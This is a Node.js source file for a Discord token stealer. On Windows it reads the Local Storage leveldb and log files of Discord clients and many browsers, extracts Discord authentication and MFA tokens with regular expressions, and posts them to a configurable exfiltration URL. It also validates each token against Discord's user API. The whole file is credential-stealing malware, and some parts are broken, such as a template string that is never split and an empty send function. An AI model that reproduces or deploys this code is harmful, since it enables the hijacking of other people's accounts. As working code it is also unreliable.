
const fs = require("fs");
let os = require("os")
const fetch = require('node-fetch');
var dir = `__dirname.split("\")`
const url = `gg`;



      if(os.platform() === "win32"){


     var paths = [`${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Discord/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/DiscordDevelopment/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Lightcord/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/discordptb/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/discordcanary/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Amigo/User Data/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Torch/User Data/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Kometa/User Data/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`
     , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`]
    
    for (i = 0; i < paths.length; i++) {
      get_token(paths[i])
    }
    
    async function get_token(path) {
      try {
          fs.readdir(path, (err, files) => {
              if (files === undefined) {
                  return
              }
    
              var filtro = files.filter(f => f.split('.').pop() === "ldb")
              for (i = 0; i < filtro.length; i++) {
                  fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function (err, data) {
                      let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                      let regex2 = /"mfa\.[\d\w_-]{84}"/;
    
                      let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                      if (match != null) {
                          match = match.replace(/"/g, '')
    
                          const benladen = new URLSearchParams();
                          benladen.append('token', match);
                          fetch(url, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({"content": match})
                        });
                          fetch('https://discord.com', { method: 'POST', body: benladen })
    
                          await fetch(`https://discord.com/api/v6/users/@me`, {
                              headers: {
                                  "authorization": match
                              }
                          }).then(resp => resp.json()).then(response => {
                              if (response.id) {
                                  send(match)
                              }
                          })
                      }
                  })
              }
          })
    
          fs.readdir(path, (err, files) => {
              if (files === undefined) {
                  return
              }
              var filtro = files.filter(f => f.split('.').pop() === "log")
              for (i = 0; i < filtro.length; i++) {
                  fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function (err, data) {
                      let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                      let regex2 = /"mfa\.[\d\w_-]{84}"/;
    
                      if (regex1.test(data)) {
    
                      }
                      let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                      if (match != null) {
                          match = match.replace(/"/g, '')
                          const attentat = new URLSearchParams();
                          attentat.append('token', match);
                          fetch('https://discord.com', { method: 'POST', body: attentat })
                          fetch(url, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({"content": match})
                        });
                          await fetch(`https://discord.com/api/v6/users/@me`, {
                              headers: {
                                  "authorization": match
                              }
                          }).then(resp => resp.json()).then(response => {
                              if (response.id) {
                                  send(match)
                              }
                          })
                      }
                  })
              }
          })
    
    
      } catch (err) {
          console.log(err)
      }
    }
    
    
    function send(token) {
      let is = "0"
    }
  }
            	